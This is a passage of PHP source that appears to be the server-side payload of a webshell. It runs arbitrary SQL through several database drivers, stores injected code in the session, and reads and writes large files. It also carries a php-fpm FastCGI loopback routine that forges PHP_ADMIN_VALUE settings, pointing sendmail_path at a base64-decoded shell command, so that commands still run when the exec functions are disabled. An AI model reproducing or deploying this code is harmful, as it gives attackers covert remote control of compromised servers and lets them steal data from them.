                    $result["column"] = &$column;
                    $result["rows"] = &$rows;
                    $rows["count"] = count($rows);
                    $column["count"] = count($column);
                    if($bool){
                        if(!$sqlresult->numColumns()){
                            $result["errMsg"] = "Query OK, ".$dbh->changes()." rows affected";
                        }else{
                            $result["errMsg"] = "Table is empty.";
                        }
                    }
                    return g_serialize($result);
                }
            }
            $dbh->close();
        }
        return g_serialize($result);
    }
    function pdoExec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb){
        $conn=null;
        $result = array();
        $conn = new PDO($connectString, $username, $password);
        $conn->setAttribute(3, 0);
        if ($execType=="update"){
            $affectRows=$conn->exec($sql);
            if ($affectRows!==false){
                $result["errMsg"] = "Query OK, ".$conn->exec($sql)." rows affected";
            }else{
                $result["errMsg"] = "Err->\n".implode(',',$conn->errorInfo());
            }
            return g_serialize($result);
        }else{
            $stm=$conn->prepare($sql);
            if ($stm->execute()){
                $row=$stm->fetch(2);
                $columns = array();
                $onerow = array();
                foreach (array_keys($row) as $key){
                    $columns[] = $key;
                    $onerow[] = $row[$key];
                }
                $result["column"] = &$columns;
                $rows = array();
                if (count($onerow)>0){
                    $rows[] = $onerow;
                }
                while ($row=$stm->fetch(2)){
                    $onerow = array();
                    foreach (array_keys($row) as $key){
                        $onerow[] = $row[$key];
                    }
                    $rows[] = $onerow;
                }
                $result["rows"] = &$rows;
                $rows["count"] = count($rows);
                $columns["count"] = count($columns);
            }else{
                $result["errMsg"] = implode(',',$stm->errorInfo());
            }
        }
        return g_serialize($result);
    }
    function odbcExec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb){
        $result = array();
        $conn = odbc_connect($connectString, $username, $password, SQL_CUR_USE_ODBC);
        if ($conn) {
            $sqlresult = odbc_exec($conn, $sql);
            if (!$sqlresult){
                $result["errMsg"] = odbc_errormsg();
                return g_serialize($result);
            }

            $columnNum = odbc_num_fields($sqlresult);
            if ($columnNum == 0){
                $result["errMsg"] = "Query OK, ".odbc_num_rows($sqlresult)." rows affected";
                return g_serialize($result);
            }

            $column = array();
            for ($i = 1; $i <= $columnNum; $i++){
                $column[] = odbc_field_name($sqlresult,$i);
            }
            $rows = array();
            while (odbc_fetch_row($sqlresult)) {
                $row = array();
                for ($i = 1; $i <= $columnNum; $i ++) {
                    $row[] = odbc_result($sqlresult,$i);
                }
                $rows[] = $row;
            }
            $rows["count"] = count($rows);
            $column["count"] = count($column);
            $result["column"]=&$column;
            $result["rows"] = &$rows;
        } else {
            $result["errMsg"] = odbc_errormsg();
        }
        return g_serialize($result);
    }

    if ($dbDrive == "pdo" && class_exists("PDO")){
        return pdoExec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb);
    }else if ($dbDrive == "odbc" && function_existsEx("odbc_connect")){
        return odbcExec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb);
    }



    if ($dbType=="mysql"&&(class_exists("mysqli")||function_existsEx("mysql_connect")||function_existsEx("mysqli_connect"))){
        if (class_exists("mysqli")){
            return mysqli_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb);
        }elseif (function_existsEx("mysql_connect")){
            return mysql_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb);
        }else if (function_existsEx("mysqli_connect")){
            return mysqliEx_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb);
        }
    }elseif ($dbType=="postgresql"&&function_existsEx("pg_connect")){
        if (function_existsEx("pg_connect")){
            return pg_execEx($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb);
        }
    }elseif ($dbType=="sqlserver"&&(function_existsEx("sqlsrv_connect")||function_existsEx("mssql_connect"))){
        if (function_existsEx("sqlsrv_connect")){
            return sqlsrv_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb);
        }elseif (function_existsEx("mssql_connect")){
            return mssql_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb);
        }
    }elseif ($dbType=="oracle"&&(function_existsEx("oci_connect")||function_existsEx("ora_plogon"))){
        if (function_existsEx("oci_connect")){
            return oci_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb);
        }else if (function_existsEx("ora_plogon")){
            return oci_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb);
        }
    }elseif ($dbType=="sqlite"&&class_exists("SQLite3")){
        return sqlite_exec($host,$port,$username,$password,$connectString,$execType,$sql,$charset,$currentDb);
    }
    $result = array();
    $result["errMsg"] = "no extension";
    return g_serialize($result);

}
function base64Encode($data){
    return base64_encode($data);
}
function test(){
    return "ok";
}
function get($key){
    global $parameters;
    if (isset($parameters[$key])){
        return $parameters[$key];
    }else{
        return null;
    }
}
function getAllParameters(){
    global $parameters;
    return $parameters;
}
function includeCode(){
    $classCode=get("binCode");
    $codeName=get("codeName");
    $_SES=&getSession();
    $_SES[$codeName]=$classCode;
    return "ok";
}
function base64Decode($string){
    return base64_decode($string);
}
function convertFilePermissions($fileAttr){
    $mod=0;
    if (strpos($fileAttr,'R')!==false){
        $mod=$mod+0444;
    }
    if (strpos($fileAttr,'W')!==false){
        $mod=$mod+0222;
    }
    if (strpos($fileAttr,'X')!==false){
        $mod=$mod+0111;
    }
    return $mod;
}
function g_close(){
    @session_start();
    $_SES=&getSession();
    $_SES=null;
    if (@session_destroy()){
        return "ok";
    }else{
        return "fail!";
    }
}

function bigFileDownload(){
    $mode=get("mode");
    $fileName=get("fileName");
    $readByteNum=get("readByteNum");
    $position=get("position");
    if ($mode=="fileSize"){
        return @filesize($fileName)."";
    }elseif ($mode=="read"){
        if (function_existsEx("fopen")&&function_existsEx("fread")&&function_existsEx("fseek")){
            $handle=fopen($fileName,"rb");
            if ($handle!==false){
                @fseek($handle,$position);
                $data=fread($handle,$readByteNum);
                @fclose($handle);
                if ($data!==false){
                    return $data;
                }else{
                    return "cannot read file";
                }
            }else{
                return "cannot open file";
            }
        }else if (function_existsEx("file_get_contents")){
            return file_get_contents($fileName,false,null,$position,$readByteNum);
        }else if (class_exists("SplFileObject")) {
            $file = new SplFileObject($fileName,"rb");
            $file->seek($position);
            $data = $file->fread($readByteNum);
            $file = null;
            return $data;
        }else{
            return "no function";
        }
    }else{
        return "no mode";
    }
}

function bigFileUpload(){
    $fileName=get("fileName");
    $fileContents=get("fileContents");
    $position=get("position");
    if(function_existsEx("fopen")&&function_existsEx("fwrite")&&function_existsEx("fseek")){
        $handle=fopen($fileName,"ab");
        if ($handle!==false){
            fseek($handle,$position);
            $len=fwrite($handle,$fileContents);
            @fclose($handle);
            if ($len!==false){
                return "ok";
            }else{
                return "cannot write file";
            }
        }else{
            return "cannot open file";
        }
    }else if (function_existsEx("file_put_contents")){
        if (file_put_contents($fileName,$fileContents,FILE_APPEND)!==false){
            return "ok";
        }else{
            return "writer fail";
        }
    }else if (class_exists("SplFileObject")){
        $file = new SplFileObject($fileName,"ab");
        $file->seek($position);
        $file->fwrite($fileContents);
        $file->fflush();
        $file=null;
        return "ok";
    }else{
        return "no function";
    }
}
function canCallGzipEncode(){
    if (function_existsEx("gzencode")){
        return "1";
    }else{
        return "0";
    }
}
function canCallGzipDecode(){
    if (function_existsEx("gzdecode")){
        return "1";
    }else{
        return "0";
    }
}
function bytesToInt($bytes) {
    return ((ord($bytes[0]) & 0xff) | ((ord($bytes[1]) & 0xff) << 8) | ((ord($bytes[2]) & 0xff) << 16)
        | ((ord($bytes[3]) & 0xff) << 24));
}

function intToBytes($val) {
    $val = (int)$val;
    $byte = "";
    $byte.= chr($val & 0xFF);
    $byte.=chr($val >> 8 & 0xFF);
    $byte.=chr($val >> 16 & 0xFF);
    $byte.=chr($val >> 24 & 0xff);
    return $byte;
}

function isGzipStream($bin){
    if (strlen($bin)>=2){
        $bin=substr($bin,0,2);
        $strInfo = @unpack("C2chars", $bin);
        $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);
        switch ($typeCode) {
            case 31139:
                return true;
            default:
                return false;
        }
    }else{
        return false;
    }
}

/* ============ php-fpm FastCGI loopback fallback (exec disabled + putenv disabled) ============
 * We act as a FastCGI client against the local php-fpm listener and forge a request that
 * sets PHP_ADMIN_VALUE: sendmail_path -> a controlled /bin/sh command, plus
 * auto_prepend_file = php://input whose body triggers mail()/error_log() (C-level popen of
 * sendmail_path). Does NOT rely on putenv or the disabled exec-family functions at all.
 */
function fcgiLenField($n){
    if($n<128) return chr($n);
    $b=pack("N",$n);
    $b[0]=chr(ord($b[0])|0x80);
    return $b;
}
function fcgiMakeRecord($type,$content,$rid=1){
    $len=strlen($content);
    $pad=(8-($len%8))%8;
    return "\x01".chr($type)
        .chr(($rid>>8)&0xff).chr($rid&0xff)
        .chr(($len>>8)&0xff).chr($len&0xff)
        .chr($pad)."\x00"
        .$content.str_repeat("\x00",$pad);
}
function fcgiFpmRoundtrip($sock,$params,$stdin,$timeout){
    $fp=false;
    $eno=0;$estr="";
    if(strpos($sock,"tcp://")===0){
        $fp=@fsockopen($sock,-1,$eno,$estr,$timeout);
    }else if(strpos($sock,"/")===0){
        $fp=@fsockopen("unix://".$sock,-1,$eno,$estr,$timeout);
    }else if(strpos($sock,":")!==false){
        $a=explode(":",$sock);
        $fp=@fsockopen($a[0],(int)$a[1],$eno,$estr,$timeout);
    }else{
        $fp=@fsockopen("unix://".$sock,-1,$eno,$estr,$timeout);
    }
    if(!$fp) return false;
    @stream_set_timeout($fp,$timeout);
    $pkt=fcgiMakeRecord(1,"\x00\x01\x00".str_repeat("\x00",5),1); // BEGIN_REQUEST responder
    $ps="";
    foreach($params as $k=>$v){ $ps.=fcgiLenField(strlen($k)).fcgiLenField(strlen($v)).$k.$v; }
    $pkt.=fcgiMakeRecord(4,$ps,1).fcgiMakeRecord(4,"",1);
    $pkt.=fcgiMakeRecord(5,$stdin,1).fcgiMakeRecord(5,"",1);
    @fwrite($fp,$pkt);
    $data="";
    while(!feof($fp)){
        $h=@fread($fp,8);
        if($h===false||strlen($h)!==8) break;
        $type=ord($h[1]);
        $len=(ord($h[4])<<8)|ord($h[5]);
        $pad=ord($h[6]);
        $buf="";
        while(strlen($buf)<$len){
            $r=@fread($fp,$len-strlen($buf));
            if($r===false||$r==="") break;
            $buf.=$r;
        }
        if($pad>0) @fread($fp,$pad);
        if($type===6) $data.=$buf;   // STDOUT
        if($type===3) break;         // END_REQUEST
    }
    @fclose($fp);
    return $data;
}
function fcgiFpmSockList(){
    $list=array();
    $ver=PHP_MAJOR_VERSION.PHP_MINOR_VERSION;
    $list[]="/tmp/php-cgi-".$ver.".sock";   // bt-panel default
    $ext=@ini_get("extension_dir");
    if(is_string($ext)&&trim($ext)!==""){   // /www/server/php/82/lib/php/extensions/...
        $parts=explode("/",str_replace("\\","/",$ext));
        $n=count($parts);
        for($i=0;$i<$n;$i++){
            if($parts[$i]==="php"&&isset($parts[$i+1])&&is_numeric($parts[$i+1])){
                $list[]=implode("/",array_slice($parts,0,$i+2))."/var/run/php-fpm.sock";
                break;
            }
        }
    }
    $list[]="/run/php/php".PHP_MAJOR_VERSION.".".PHP_MINOR_VERSION."-fpm.sock";
    $list[]="/var/run/php/php".PHP_MAJOR_VERSION.".".PHP_MINOR_VERSION."-fpm.sock";
    $list[]="/var/run/php-fpm.sock";
    $list[]="/var/run/php".PHP_MAJOR_VERSION."-fpm.sock";
    $list[]="/tmp/php-cgi.sock";
    $list[]="/tmp/php-fpm.sock";
    $list[]="127.0.0.1:9000";
    $cfgs=@glob("/www/server/nginx/conf/enable-php*.conf");
    if(!is_array($cfgs)||empty($cfgs)) $cfgs=@glob("/www/server/nginx/conf/vhost/*.conf");
    if(!is_array($cfgs)||empty($cfgs)) $cfgs=@glob("/etc/nginx/conf.d/*.conf");
    if(!is_array($cfgs)||empty($cfgs)) $cfgs=@glob("/etc/nginx/sites-enabled/*");
    if(is_array($cfgs)){
        foreach($cfgs as $c){
            $txt=@file_get_contents($c);
            if($txt!==false&&preg_match_all('/fastcgi_pass\s+(?:unix:([^\s;]+)|([\d\.]+):(\d+))/',$txt,$m,PREG_SET_ORDER)){
                foreach($m as $mm){
                    if(isset($mm[1])&&$mm[1]!==""){
                        $list[]=(strpos($mm[1],"/")===0)?$mm[1]:("/".$mm[1]);
                    }else if(isset($mm[2])&&isset($mm[3])&&$mm[2]!==""){
                        $list[]=$mm[2].":".$mm[3];
                    }
                }
            }
        }
    }
    foreach(array("/run/php","/var/run/php") as $d){
        $fs=@scandir($d);
        if(is_array($fs)){
            foreach($fs as $f){
                if($f!=="."&&$f!==".."&&preg_match('/\.sock$/',$f)) $list[]=$d."/".$f;
            }
        }
    }
    $fs=@scandir("/tmp");
    if(is_array($fs)){
        foreach($fs as $f){
            if($f!=="."&&$f!==".."&&preg_match('/\.sock$/',$f)&&preg_match('/(php|fpm|cgi)/i',$f)) $list[]="/tmp/".$f;
        }
    }
    $out=array();
    foreach($list as $s){
        $s=trim($s);
        if($s!==""&&!in_array($s,$out,true)) $out[]=$s;
    }
    return $out;
}
function execByFpm($cmd){
    if(DIRECTORY_SEPARATOR==="\\") return false;
    $sapi=PHP_SAPI;
    if($sapi!=="fpm-fcgi"&&$sapi!=="cgi-fcgi") return false;
    if(!is_string($cmd)||$cmd==="") return false;
    $script=isset($_SERVER["SCRIPT_FILENAME"])?@realpath($_SERVER["SCRIPT_FILENAME"]):false;
    if(!$script||!@is_file($script)) $script=@realpath(__FILE__);
    if(!$script||!@is_file($script)) return false;
    $dir=@dirname($script);
    $outFile=$dir."/.bt".mt_rand(100000,999999).mt_rand(100000,999999).".log";
    $b64=base64_encode($cmd);
    $sendmail="/bin/sh -c 'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;echo ".$b64."|base64 -d|/bin/sh > ".$outFile." 2>&1'";
    $oPhp='<?php $f='.var_export($outFile,true).';if(!@file_exists($f)){@mail("a@localhost","","");}if(!@file_exists($f)){@error_log("",1);}echo "[BTR1]".@file_get_contents($f)."[BTRE]";@unlink($f);exit;?>';
    $name="/".basename($script);
    $iniValue="allow_url_include = On\n"."auto_prepend_file = php://input\n"."sendmail_path = ".$sendmail;
    $params=array(
        "GATEWAY_INTERFACE"=>"FastCGI/1.0",
        "REQUEST_METHOD"=>"POST",
        "SCRIPT_FILENAME"=>$script,
        "SCRIPT_NAME"=>$name,
        "REQUEST_URI"=>$name,
        "QUERY_STRING"=>"",
        "DOCUMENT_ROOT"=>$dir,
        "SERVER_SOFTWARE"=>"nginx/1.0",
        "REMOTE_ADDR"=>"127.0.0.1",
        "REMOTE_PORT"=>"8080",
        "SERVER_ADDR"=>"127.0.0.1",
        "SERVER_PORT"=>"80",
        "SERVER_NAME"=>"localhost",
        "SERVER_PROTOCOL"=>"HTTP/1.1",
        "CONTENT_TYPE"=>"application/x-www-form-urlencoded",
        "CONTENT_LENGTH"=>(string)strlen($oPhp),
        "PHP_ADMIN_VALUE"=>$iniValue,
        "PHP_VALUE"=>"auto_prepend_file = php://input",
        "REDIRECT_STATUS"=>"200"
    );
    foreach(fcgiFpmSockList() as $sock){
        $r=fcgiFpmRoundtrip($sock,$params,$oPhp,4);
        if($r!==false){
            $a=strpos($r,"[BTR1]");
            $b=strpos($r,"[BTRE]");
            if($a!==false&&$b!==false&&$b>$a){
                @unlink($outFile);
                return substr($r,$a+6,$b-($a+6));
            }
        }
    }
    @unlink($outFile);
    return false;
}
